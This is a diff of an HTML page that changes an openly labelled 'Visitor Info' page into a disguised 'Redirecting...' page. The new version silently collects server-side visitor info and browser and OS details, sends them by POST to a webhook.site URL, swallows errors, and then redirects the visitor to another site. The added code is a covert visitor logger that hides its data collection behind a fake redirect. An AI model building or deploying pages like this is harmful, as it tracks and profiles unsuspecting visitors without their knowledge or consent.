@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Visitor Info</title>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
   <style>
     body {
-      font-family: monospace;
       background: #111;
       color: #0f0;
-      padding: 20px;
-    }
-    pre {
-      white-space: pre-wrap;
+      font-family: monospace;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
   </style>
 </head>
 <body>
-  <h2>Visitor Information</h2>
-  <pre id="output">Loading...</pre>
+  <div>Redirecting...</div>
 
   <script>
-    //dont nuke pls
     const WEBHOOK_URL = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
+    const REDIRECT_URL = "https://example.com";
 
     function getBrowserInfo() {
       const ua = navigator.userAgent;
@@ -41,7 +41,7 @@
       return { browser, os };
     }
 
-    async function collectInfo() {
+    async function collectAndRedirect() {
       try {
         const serverData = await fetch("/api/info").then(r => r.json());
         const { browser, os } = getBrowserInfo();
@@ -70,10 +70,6 @@
           ...serverData,
           client: clientData
         };
-
-
-        document.getElementById("output").textContent =
-          JSON.stringify(finalData, null, 2);
         if (WEBHOOK_URL && WEBHOOK_URL.startsWith("http")) {
           fetch(WEBHOOK_URL, {
             method: "POST",
@@ -84,13 +80,14 @@
           }).catch(() => {});
         }
 
-      } catch (err) {
-        document.getElementById("output").textContent =
-          "Failed to load visitor info.";
+      } catch (e) {
       }
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 800);
     }
 
-    collectInfo();
+    collectAndRedirect();
   </script>
 </body>
 </html>
